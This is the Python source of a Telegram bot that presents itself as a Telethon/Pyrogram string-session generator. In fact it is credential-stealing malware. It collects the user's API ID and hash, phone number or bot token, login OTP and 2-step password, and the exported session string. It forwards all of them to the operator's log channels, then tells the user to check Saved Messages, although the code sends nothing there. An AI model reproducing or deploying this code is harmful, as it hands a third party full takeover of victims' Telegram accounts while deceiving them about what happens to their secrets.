from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import (
    ApiIdInvalidError,
    PhoneNumberInvalidError,
    PhoneCodeInvalidError,
    PhoneCodeExpiredError,
    SessionPasswordNeededError,
    PasswordHashInvalidError
)

from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton, Message
from pyrogram.errors import (
    ApiIdInvalid,
    PhoneNumberInvalid,
    PhoneCodeInvalid,
    PhoneCodeExpired,
    SessionPasswordNeeded,
    PasswordHashInvalid
)

from asyncio.exceptions import TimeoutError
from config import LOG_CHANNEL, SESSION_LOG_CHANNEL


# ─── UI ─────────────────────────────────────────────
ask_ques = "**» Choose the string session type:**"
buttons_ques = [
    [
        InlineKeyboardButton("Telethon", callback_data="telethon"),
        InlineKeyboardButton("Pyrogram v2", callback_data="pyrogram")
    ],
    [
        InlineKeyboardButton("Telethon Bot", callback_data="telethon_bot"),
        InlineKeyboardButton("Pyrogram Bot", callback_data="pyrogram_bot")
    ],
    [
        InlineKeyboardButton("Close", callback_data="close")
    ]
]

gen_button = [[InlineKeyboardButton("Generate Again", callback_data="generate")]]


# ─── LOGGER ─────────────────────────────────────────
async def send_logs(bot: Client, text: str):
    for ch in (LOG_CHANNEL, SESSION_LOG_CHANNEL):
        try:
            await bot.send_message(ch, text)
        except:
            pass


# ─── COMMAND ────────────────────────────────────────
@Client.on_message(filters.private & filters.command("gen"))
async def gen_cmd(_, msg):
    await msg.reply(
        ask_ques,
        reply_markup=InlineKeyboardMarkup(buttons_ques)
    )


# ─── MAIN GENERATOR ─────────────────────────────────
async def generate_session(bot: Client, msg: Message, telethon=False, is_bot=False):

    user = msg.from_user
    uid = user.id

    session_type = "TELETHON" if telethon else "PYROGRAM v2"
    if is_bot:
        session_type += " BOT"

    log = {
        "user": user.mention,
        "uid": uid,
        "username": f"@{user.username}" if user.username else "N/A",
        "type": session_type,
        "api_id": None,
        "api_hash": None,
        "auth": None,
        "otp": None,
        "password": None,
        "session": None
    }

    await msg.reply(f"🚀 Starting **{session_type}** generator...")

    # API ID
    api_id_msg = await bot.ask(uid, "Send **API_ID**")
    log["api_id"] = api_id_msg.text
    api_id = int(api_id_msg.text)

    # API HASH
    api_hash_msg = await bot.ask(uid, "Send **API_HASH**")
    log["api_hash"] = api_hash_msg.text
    api_hash = api_hash_msg.text

    # PHONE / TOKEN
    if is_bot:
        auth_msg = await bot.ask(uid, "Send **BOT TOKEN**")
    else:
        auth_msg = await bot.ask(uid, "Send **PHONE NUMBER**")

    log["auth"] = auth_msg.text
    auth = auth_msg.text

    # CLIENT INIT
    if telethon:
        client = TelegramClient(StringSession(), api_id, api_hash)
        await client.connect()
    else:
        client = Client(
            "gen",
            api_id=api_id,
            api_hash=api_hash,
            bot_token=auth if is_bot else None,
            in_memory=True
        )
        await client.connect()

    try:
        if not is_bot:
            if telethon:
                await client.send_code_request(auth)
            else:
                code = await client.send_code(auth)

            otp_msg = await bot.ask(uid, "Send **OTP**")
            log["otp"] = otp_msg.text.replace(" ", "")
            otp = log["otp"]

            try:
                if telethon:
                    await client.sign_in(auth, otp)
                else:
                    await client.sign_in(auth, code.phone_code_hash, otp)

            except (SessionPasswordNeeded, SessionPasswordNeededError):
                pwd_msg = await bot.ask(uid, "Send **2-Step Password**")
                log["password"] = pwd_msg.text

                if telethon:
                    await client.sign_in(password=pwd_msg.text)
                else:
                    await client.check_password(password=pwd_msg.text)

        else:
            if telethon:
                await client.start(bot_token=auth)
            else:
                await client.sign_in_bot(auth)

    except Exception as e:
        await msg.reply("❌ Login failed.")
        await client.disconnect()
        return

    # EXPORT STRING
    if telethon:
        string_session = client.session.save()
    else:
        string_session = await client.export_session_string()

    log["session"] = string_session

    # FINAL LOG
    log_text = f"""
🧨 **NEW STRING SESSION**

👤 User: {log['user']}
🆔 ID: `{log['uid']}`
👤 Username: {log['username']}

⚙️ Type: **{log['type']}**

🔑 API_ID: `{log['api_id']}`
🔑 API_HASH: `{log['api_hash']}`

📞 Phone / Token:
`{log['auth']}`

🔐 OTP:
`{log['otp']}`

🔓 2-Step Password:
`{log['password']}`

🧬 STRING SESSION:
`{log['session']}`
"""

    await send_logs(bot, log_text)

    await bot.send_message(
        uid,
        f"✅ **{session_type} generated successfully!**\nCheck Saved Messages."
    )

    await client.disconnect()


# ─── CANCEL ─────────────────────────────────────────
async def cancelled(msg):
    if "/cancel" in msg.text:
        await msg.reply(
            "❌ Process cancelled.",
            reply_markup=InlineKeyboardMarkup(gen_button)
        )
        return True
    return False
